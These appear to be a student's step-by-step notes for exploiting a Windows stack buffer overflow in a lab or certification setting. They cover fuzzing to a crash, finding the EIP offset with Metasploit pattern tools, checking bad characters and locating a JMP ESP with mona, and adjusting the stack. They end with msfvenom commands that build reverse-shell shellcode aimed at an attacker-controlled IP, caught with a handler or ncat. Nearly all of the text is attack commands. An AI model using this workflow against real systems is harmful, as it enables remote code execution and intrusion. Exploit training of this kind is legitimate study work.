#step 1, find the overflow length 
how many 'Z' it takes to crash the program
Alternative way 
!mona findmsp

#step 2, find the length to hit EIP, generate length with the following
/usr/bin/msf-pattern_create

#step 3, find offset with the following
/usr/bin/msf-pattern_offset

#step 4, send extra chars to confirm if you do have control of EIP by filling it with different value (B)

#step 5, send char stack AND the Letters, add characters to template that cause the stack to corrupt until the hexdump matches
Compare all bad chars generated and then ESP address in the crashed program vs hexdump of the written file
!mona compare -a esp -f c:\badchar_test.bin

#step 6, find a way to jump into ESP with !mona jmp -r ESP, set it into the var below

Look for jump esp instruction excluding badchars
!mona jmp -r esp -cpb "\x00\x0A"

Offsec way
  !monda find -s "\xff\xe4" -m MODULENAME (NO DEP OR ASLR) NEED TO DO LITTLE ENDIAN unless using python to reverse

#step 7, pop calc.exe
msfvenom -p windows/exec -b \x00\x0A -f python --var-name shellcode_calc CMD=calc.exe EXITFUNC=thread

#step 8, instead of using NOPs, do this the right way. drag ESP far enough to not be affected. Only takes 3 bytes. 
metasm > sub esp,0x10

#step 9, generate shell code
#msfvenom -p windows/shell/reverse_tcp LPORT=1337 LHOST=10.11.0.X -b '\x00' -f ruby
#remember to insert the bad characters in the -b section
# TAKE NOTE OF HOW BIG YOUR SHELL CODE IS
#Python generation without a stage can be caught by ncat and does not crash the program because of exit function
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.170 LPORT=443 -b \x00\x0A -f python --var-name shellcode EXITFUNC=thread

#step 10, make sure to catch with a multi/handler in msfconsole or ncat if using stageless payload
